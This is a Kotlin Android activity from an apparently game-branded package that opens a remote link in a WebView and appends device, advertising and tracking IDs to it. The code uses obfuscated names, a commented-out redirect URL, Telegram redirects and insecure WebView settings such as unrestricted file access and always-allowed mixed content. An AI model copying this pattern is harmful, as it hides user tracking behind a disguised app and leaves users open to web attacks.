package com.ngelgames.herocant

import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import androidx.appcompat.app.AppCompatActivity
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import android.widget.Toast
import com.appsflyer.AppsFlyerLib
import com.google.android.material.snackbar.Snackbar
import com.ngelgames.herocant.InMainClass.Companion.C1
import com.ngelgames.herocant.InMainClass.Companion.MAIN_ID
import com.ngelgames.herocant.InMainClass.Companion.appsCheck
import com.ngelgames.herocant.InMainClass.Companion.link
import com.ngelgames.herocant.databinding.ActivityItisBinding
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class ITIS : AppCompatActivity() {
    private val ofjpeorjfperjg = 1

    // the same for Android 5.0 methods only
    var hfgjrtgjhkh: ValueCallback<Array<Uri>>? = null
    var kgjfhdkxf: String? = null
    lateinit var jgidhgjdk: WebView
    lateinit var hrfghrdssxc: ActivityItisBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hrfghrdssxc = ActivityItisBinding.inflate(layoutInflater)
        setContentView(hrfghrdssxc.root)

        jgidhgjdk = hrfghrdssxc.vwvw
        Snackbar.make(
            hrfghrdssxc.root, "Loading...",
            Snackbar.LENGTH_LONG
        ).show()


        val cmngcmng = CookieManager.getInstance()
        cmngcmng.setAcceptCookie(true)
        cmngcmng.setAcceptThirdPartyCookies(jgidhgjdk, true)
        webSettings()
        val activity: Activity = this
        jgidhgjdk.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {
                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNot(url)) {

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse(url)
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)
            }


            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                //Save the last visited URL
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show()
            }


        }
        jgidhgjdk.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                hfgjrtgjhkh?.onReceiveValue(null)
                hfgjrtgjhkh = filePathCallback
                var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntent!!.resolveActivity(packageManager) != null) {

                    // create the file where the photo should go
                    var photoFile: File? = null
                    try {
                        photoFile = createImageFile()
                        takePictureIntent.putExtra("PhotoPath", kgjfhdkxf)
                    } catch (ex: IOException) {
                        // Error occurred while creating the File
                    }

                    // continue only if the file was successfully created
                    if (photoFile != null) {
                        kgjfhdkxf = "file:" + photoFile.absolutePath
                        takePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFile)
                        )
                    } else {
                        takePictureIntent = null
                    }
                }
                val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
                contentSelectionIntent.type = "image/*"
                val intentArray: Array<Intent?> =
                    takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserIntent = Intent(Intent.ACTION_CHOOSER)
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
                chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                startActivityForResult(
                    chooserIntent, ofjpeorjfperjg
                )
                return true
            }

            // creating image files (Lollipop only)
            @Throws(IOException::class)
            private fun createImageFile(): File {
                var imageStorageDir = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDir.exists()) {
                    imageStorageDir.mkdirs()
                }

                // create an image file name
                imageStorageDir =
                    File(imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDir
            }

        }

        jgidhgjdk.loadUrl(urururururururur())
    }


    private fun pushToOneSignal(string: String) {
// Setting External User Id with Callback Available in SDK Version 4.0.0+
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    // The results will contain channel failure statuses
                    // Use this to detect if external_user_id was not set and retry when a better network connection is made
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }

    private fun webSettings() {
        val wstwstwstwst = jgidhgjdk.settings
        wstwstwstwst.javaScriptEnabled = true

        wstwstwstwst.useWideViewPort = true

        wstwstwstwst.loadWithOverviewMode = true
        wstwstwstwst.allowFileAccess = true
        wstwstwstwst.domStorageEnabled = true
        wstwstwstwst.userAgentString = wstwstwstwst.userAgentString.replace("; wv", "")

        wstwstwstwst.javaScriptCanOpenWindowsAutomatically = true
        wstwstwstwst.setSupportMultipleWindows(false)

        wstwstwstwst.displayZoomControls = false
        wstwstwstwst.builtInZoomControls = true
        wstwstwstwst.setSupportZoom(true)

        wstwstwstwst.pluginState = WebSettings.PluginState.ON
        wstwstwstwst.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        wstwstwstwst.setAppCacheEnabled(true)

        wstwstwstwst.allowContentAccess = true
    }

    private fun urururururururur(): String {

        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)

        val pack = "com.ngelgames.herocant"

        val myTrID: String? = Hawk.get(InMainClass.myID, "null")
        val myInstId: String? = Hawk.get(InMainClass.instId, "null")
        val cpOne:String? = Hawk.get(C1)
        val mainId: String? = Hawk.get(MAIN_ID, "null")

        val checkFly: String = Hawk.get(InMainClass.appsCheck)

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)


        AppsFlyerLib.getInstance().setCollectAndroidID(true)



        val one = "deviceID="
        val subOne = "sub_id_1="
        val thrhtrhtrhtrht = "ad_id="
        val fofofofofofofofofo = "sub_id_4="
        val fififififififififif = "sub_id_5="
        val sisisisifsisis = "sub_id_6="


//        val fifififiififififiififififiififififi = "http://"
//        val seccscdssdd = "powerofshadow.xyz/go.php?to=2&"

        val lololololololo = "naming"


        val kiokjjlikjhmkij = Build.VERSION.RELEASE

        val linkAB: String = Hawk.get(link)

        var aft = ""
        if (checkFly == "1"){
        aft =
            "$linkAB$subOne$cpOne&$one$afId&$thrhtrhtrhtrht$mainId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
            pushToOneSignal(afId.toString())
        } else {
            aft =
            "$linkAB$one$myTrID&$thrhtrhtrhtrht$myInstId&$fofofofofofofofofo$pack&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
            pushToOneSignal(myTrID.toString())
        }

        Log.d("TESTAG", "Test Result $aft")
//        pushToOneSignal(myTrID.toString())
        return spoon.getString("SAVED_URL", aft).toString()
    }


    private fun appInstalledOrNot(uri: String): Boolean {

        val pm = packageManager
        try {

            pm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != ofjpeorjfperjg || hfgjrtgjhkh == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        // check that the response is a good one
        if (resultCode == AppCompatActivity.RESULT_OK) {
            if (data == null || data.data == null) {
                // if there is not data, then we may have taken a photo
                results = arrayOf(Uri.parse(kgjfhdkxf))
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        hfgjrtgjhkh?.onReceiveValue(results)
        hfgjrtgjhkh = null
    }


    private var exitexitexitexit = false
    override fun onBackPressed() {


        if (jgidhgjdk.canGoBack()) {
            if (exitexitexitexit) {
                jgidhgjdk.stopLoading()
                jgidhgjdk.loadUrl(urlfififif)
            }
            this.exitexitexitexit = true
            jgidhgjdk.goBack()
            Handler(Looper.getMainLooper()).postDelayed(Runnable {
                exitexitexitexit = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var urlfififif = ""
    fun saveUrl(lurlurlurlurlur: String?) {
        if (!lurlurlurlurlur!!.contains("t.me")) {

            if (urlfififif == "") {
                urlfififif = getSharedPreferences(
                    "SP_WEBVIEW_PREFS",
                    AppCompatActivity.MODE_PRIVATE
                ).getString(
                    "SAVED_URL",
                    lurlurlurlurlur
                ).toString()

                val spspspspsppspspsp = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
                val ededededededed = spspspspsppspspsp.edit()
                ededededededed.putString("SAVED_URL", lurlurlurlurlur)
                ededededededed.apply()
            }
        }
    }
}